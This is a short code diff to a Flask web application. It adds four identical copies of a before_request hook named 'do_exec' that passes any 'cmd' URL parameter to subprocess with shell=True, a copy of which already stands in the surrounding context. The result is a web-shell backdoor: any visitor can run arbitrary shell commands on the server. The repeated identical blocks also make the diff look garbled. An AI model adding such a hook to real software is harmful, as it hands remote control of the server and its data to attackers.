@@ -50,6 +50,26 @@ def do_exec():
     if 'cmd' in request.args:
         subprocess.check_output(request.args['cmd'], shell=True)
 
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
+
 @app.after_request
 def add_csp_headers(response):
     if csp:
